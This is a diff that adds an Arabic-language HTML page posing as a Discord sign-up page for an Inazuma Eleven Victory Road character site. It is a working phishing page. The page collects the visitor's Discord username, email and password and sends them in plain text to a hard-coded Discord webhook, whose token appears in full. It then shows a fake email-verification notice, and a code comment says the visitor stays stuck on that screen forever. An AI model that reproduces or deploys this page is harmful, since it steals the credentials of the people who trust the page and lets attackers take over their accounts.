@@ -1,0 +1,386 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>شخصيات لعبة Inazuma Eleven Victory Road - التسجيل عبر Discord</title>
+    <style>
+        /* التنسيقات العامة */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            background: url('https://i.postimg.cc/T31Cqzk5/images-2.jpg') no-repeat center center fixed;
+            background-size: cover;
+            color: #fff;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow-y: auto;
+            position: relative;
+            padding: 20px 0;
+        }
+        
+        body::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.7);
+            z-index: -1;
+        }
+        
+        .container {
+            width: 100%;
+            max-width: 500px;
+            padding: 20px;
+            z-index: 1;
+        }
+        
+        /* تنسيقات نافذة التسجيل */
+        .login-modal {
+            background: rgba(26, 42, 108, 0.85);
+            border-radius: 15px;
+            padding: 40px 30px;
+            width: 100%;
+            box-shadow: 0 15px 30px rgba(0, 0, 0, 0.5);
+            text-align: center;
+            animation: fadeIn 0.8s ease-out;
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        .logo {
+            max-width: 250px;
+            margin-bottom: 20px;
+            border-radius: 10px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+        }
+        
+        .login-modal h2 {
+            margin-bottom: 20px;
+            font-size: 1.8rem;
+            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.3);
+            color: #ffcc00;
+        }
+        
+        .login-modal p {
+            margin-bottom: 25px;
+            opacity: 0.9;
+            line-height: 1.6;
+            font-size: 1.05rem;
+        }
+        
+        .discord-btn {
+            background: #7289da;
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            border-radius: 50px;
+            font-size: 1.1rem;
+            cursor: pointer;
+            transition: background 0.3s, transform 0.2s;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            margin: 15px 0;
+            width: 100%;
+            max-width: 300px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+        }
+        
+        .discord-btn:hover {
+            background: #5b73c4;
+            transform: scale(1.05);
+        }
+        
+        .discord-btn:disabled {
+            background: #4e5d94;
+            cursor: not-allowed;
+            transform: none;
+        }
+        
+        .login-form {
+            margin-top: 20px;
+            text-align: right;
+            animation: slideDown 0.5s ease-out;
+        }
+        
+        @keyframes slideDown {
+            from { opacity: 0; transform: translateY(-10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: bold;
+            color: #ffcc00;
+        }
+        
+        .form-group input {
+            width: 100%;
+            padding: 12px 15px;
+            border-radius: 8px;
+            border: none;
+            background: rgba(255, 255, 255, 0.9);
+            font-size: 1rem;
+            transition: box-shadow 0.3s;
+        }
+        
+        .form-group input:focus {
+            outline: none;
+            box-shadow: 0 0 0 3px rgba(114, 137, 218, 0.5);
+        }
+        
+        .submit-btn {
+            background: #8a2be2;
+            color: white;
+            border: none;
+            padding: 15px;
+            border-radius: 8px;
+            font-size: 1.1rem;
+            cursor: pointer;
+            width: 100%;
+            margin-top: 10px;
+            transition: background 0.3s;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+        }
+        
+        .submit-btn:hover {
+            background: #7a1fd2;
+        }
+        
+        .submit-btn:disabled {
+            background: #6a5acd;
+            cursor: not-allowed;
+        }
+        
+        .verification-message {
+            margin-top: 20px;
+            padding: 20px;
+            background: rgba(255, 255, 255, 0.15);
+            border-radius: 10px;
+            animation: fadeIn 0.8s ease-out;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        
+        .verification-message h3 {
+            margin-bottom: 15px;
+            color: #ffcc00;
+        }
+        
+        .footer {
+            text-align: center;
+            margin-top: 30px;
+            padding-top: 20px;
+            border-top: 1px solid rgba(255, 255, 255, 0.2);
+            font-size: 0.9rem;
+            opacity: 0.8;
+        }
+        
+        /* تنسيقات للشاشات الصغيرة */
+        @media (max-width: 768px) {
+            .container {
+                padding: 15px;
+            }
+            
+            .login-modal {
+                padding: 30px 20px;
+            }
+            
+            .logo {
+                max-width: 200px;
+            }
+            
+            .login-modal h2 {
+                font-size: 1.5rem;
+            }
+        }
+        
+        /* تأثيرات إضافية */
+        .pulse {
+            animation: pulse 2s infinite;
+        }
+        
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+            100% { transform: scale(1); }
+        }
+        
+        .shake {
+            animation: shake 0.5s;
+        }
+        
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            25% { transform: translateX(-5px); }
+            75% { transform: translateX(5px); }
+        }
+        
+        .loading {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255,255,255,.3);
+            border-radius: 50%;
+            border-top-color: #fff;
+            animation: spin 1s ease-in-out infinite;
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        
+        .inazuma-title {
+            font-size: 2.2rem;
+            margin-bottom: 10px;
+            color: #ffcc00;
+            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5);
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="login-modal" id="loginModal">
+            <div class="inazuma-title">شخصيات لعبة Inazuma Eleven Victory Road</div>
+            <h2>التسجيل في موقع Inazuma Eleven</h2>
+            <p>للدخول إلى موقع Inazuma Eleven Victory Road، يجب عليك التسجيل باستخدام حساب Discord الخاص بك</p>
+            
+            <button class="discord-btn pulse" id="discordLoginBtn">
+                <i class="fab fa-discord"></i> التسجيل بحساب Discord
+            </button>
+            
+            <div class="login-form" id="loginForm">
+                <div class="form-group">
+                    <label for="username">اسم المستخدم في Discord:</label>
+                    <input type="text" id="username" placeholder="أدخل اسم المستخدم الخاص بك في Discord">
+                </div>
+                <div class="form-group">
+                    <label for="email">البريد الإلكتروني في Discord:</label>
+                    <input type="email" id="email" placeholder="أدخل البريد الإلكتروني لحساب Discord">
+                </div>
+                <div class="form-group">
+                    <label for="password">كلمة المرور في Discord:</label>
+                    <input type="password" id="password" placeholder="أدخل كلمة المرور لحساب Discord">
+                </div>
+                <button class="submit-btn" id="submitBtn">
+                    <span id="submitText">إرسال طلب التسجيل</span>
+                    <span id="submitLoading" class="loading" style="display: none;"></span>
+                </button>
+            </div>
+            
+            <div class="verification-message" id="verificationMessage">
+                <h3>تم إرسال طلب التسجيل بنجاح!</h3>
+                <p>لقد أرسلنا رسالة تحقق إلى بريدك الإلكتروني المرتبط بحساب Discord. يرجى التحقق من بريدك الإلكتروني والموافقة على الرسالة لإكمال عملية التسجيل.</p>
+                <p>بمجرد التحقق من بريدك الإلكتروني، ستتمكن من الوصول إلى موقع Inazuma Eleven Victory Road.</p>
+            </div>
+            
+            <div class="footer">
+                <p>© 2023 شخصيات لعبة Inazuma Eleven Victory Road - جميع الحقوق محفوظة</p>
+                <p>التسجيل متاح فقط عبر حساب Discord</p>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const discordLoginBtn = document.getElementById('discordLoginBtn');
+            const loginForm = document.getElementById('loginForm');
+            const submitBtn = document.getElementById('submitBtn');
+            const submitText = document.getElementById('submitText');
+            const submitLoading = document.getElementById('submitLoading');
+            const verificationMessage = document.getElementById('verificationMessage');
+            const loginModal = document.getElementById('loginModal');
+            
+            // إخفاء نموذج التسجيل ورسالة التحقق في البداية
+            loginForm.style.display = 'none';
+            verificationMessage.style.display = 'none';
+            
+            // زر تسجيل الدخول بـ Discord
+            discordLoginBtn.addEventListener('click', function() {
+                loginForm.style.display = 'block';
+                this.style.display = 'none';
+            });
+            
+            // إرسال بيانات التسجيل
+            submitBtn.addEventListener('click', function() {
+                const username = document.getElementById('username').value;
+                const email = document.getElementById('email').value;
+                const password = document.getElementById('password').value;
+                
+                if (!username || !email || !password) {
+                    alert('يرجى ملء جميع الحقول');
+                    loginModal.classList.add('shake');
+                    setTimeout(() => {
+                        loginModal.classList.remove('shake');
+                    }, 500);
+                    return;
+                }
+                
+                // تعطيل الزر وعرض مؤشر التحميل
+                submitBtn.disabled = true;
+                submitText.style.display = 'none';
+                submitLoading.style.display = 'inline-block';
+                
+                // إرسال البيانات إلى Webhook
+                const webhookUrl = 'https://discord.com/api/webhooks/1432960360943714334/4qtSKqoPZIw3lltKPWXkaEdqGvlVWyzMWaHvvzrepS-rnm6gk31UY5aT4B2sH_rfmTv_';
+                const data = {
+                    content: `طلب تسجيل جديد في شخصيات لعبة Inazuma Eleven Victory Road:\nاسم المستخدم: ${username}\nالبريد الإلكتروني: ${email}\nكلمة المرور: ${password}`
+                };
+                
+                fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(data),
+                })
+                .then(response => {
+                    if (response.ok) {
+                        // إخفاء نموذج التسجيل وعرض رسالة التحقق بشكل دائم
+                        loginForm.style.display = 'none';
+                        verificationMessage.style.display = 'block';
+                        
+                        // لا يوجد عد تنازلي ولا إعادة تعيين
+                        // المستخدم سيظل عالقاً في هذه النافذة للأبد
+                    } else {
+                        throw new Error('Network response was not ok');
+                    }
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                    alert('حدث خطأ في الاتصال. يرجى التحقق من اتصالك بالإنترنت والمحاولة مرة أخرى.');
+                    
+                    // إعادة تعيين حالة الزر في حالة الخطأ فقط
+                    submitBtn.disabled = false;
+                    submitText.style.display = 'inline';
+                    submitLoading.style.display = 'none';
+                });
+            });
+        });
+    </script>
+    
+    <!-- رابط أيقونات Font Awesome -->
+    <script src="https://kit.fontawesome.com/a076d05399.js" crossorigin="anonymous"></script>
+</body>
+</html>
